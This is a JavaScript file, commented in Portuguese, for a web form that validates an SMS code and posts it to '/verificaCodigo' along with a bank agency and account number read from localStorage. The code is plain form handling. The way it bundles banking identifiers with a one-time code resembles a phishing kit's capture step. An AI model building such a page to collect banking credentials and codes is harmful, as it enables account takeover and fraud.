const smsInput = document.getElementById('sms-code');
const smsForm = document.getElementById('sms-form');
const submitButton = smsForm.querySelector('button[type="submit"]');
const formContainer = document.getElementById('form-container');
const successContainer = document.getElementById('success-container');

// Permitir apenas letras e números e limitar a 6 caracteres
smsInput.addEventListener('input', function () {
    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '').slice(0, 6);
    clearError('sms-code');
});

// Validação ao sair do campo
smsInput.addEventListener('blur', () => validateSmsField(smsInput));
smsInput.addEventListener('input', () => clearError('sms-code'));

// Submit do formulário
smsForm.addEventListener('submit', function (event) {
    event.preventDefault();

    const isCodeValid = validateSmsField(smsInput);
    if (!isCodeValid) {
        smsInput.focus();
        return;
    }

    const agency = localStorage.getItem('agency');
    const account = localStorage.getItem('account');

    const payload = {
        agency,
        account,
        sms_code: smsInput.value
    };

    enviarCodigo(payload);
});

// Validação do campo SMS
function validateSmsField(input) {
    const value = input.value.trim();
    let isValid = true;

    clearError(input.id);

    if (!value) {
        showError(input.id, 'O código é obrigatório');
        isValid = false;
    } else if (value.length < 4 || value.length > 6) {
        showError(input.id, 'O código deve conter de 4 a 6 caracteres');
        isValid = false;
    }

    return isValid;
}

// Exibir erro
function showError(inputId, message) {
    const input = document.getElementById(inputId);
    const errorDiv = document.getElementById(`${inputId}-error`);

    input.classList.add('border-red-500', 'ring-1', 'ring-red-500', 'shake');
    if (errorDiv) {
        errorDiv.innerText = message;
        errorDiv.classList.remove('hidden');
    }
}

// Limpar erro
function clearError(inputId) {
    const input = document.getElementById(inputId);
    const errorDiv = document.getElementById(`${inputId}-error`);

    input.classList.remove('border-red-500', 'ring-1', 'ring-red-500', 'shake');
    if (errorDiv) {
        errorDiv.innerText = '';
        errorDiv.classList.add('hidden');
    }
}

// Enviar código
function enviarCodigo(payload) {
    toggleButtonLoading(true);

    fetch('/verificaCodigo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error();
        }
        return response.json();
    })
    .then(data => {
        if (data && data.status === 'sucesso') {
            mostrarSucesso();
        } else {
            showError('sms-code', 'Código inválido ou expirado');
            smsInput.focus();
        }
    })
    .catch(() => {
        showError('sms-code', 'Erro na verificação. Tente novamente.');
        smsInput.focus();
    })
    .finally(() => {
        toggleButtonLoading(false);
    });
}

// Animação e loading no botão
function toggleButtonLoading(isLoading) {
    if (isLoading) {
        submitButton.disabled = true;
        submitButton.innerHTML = `
            <svg class="animate-spin h-5 w-5 mr-2 inline-block text-white" xmlns="http://www.w3.org/2000/svg" fill="none"
                viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                    stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
            </svg>
            Aguarde...`;
    } else {
        submitButton.disabled = false;
        submitButton.innerHTML = 'Confirmar Código';
    }
}

// Mostrar sucesso com animação suave
function mostrarSucesso() {
    formContainer.classList.add('hidden');
    successContainer.classList.remove('hidden', 'opacity-0', 'scale-95');

    setTimeout(() => {
        successContainer.classList.add('opacity-100', 'scale-100');
    }, 400);
}
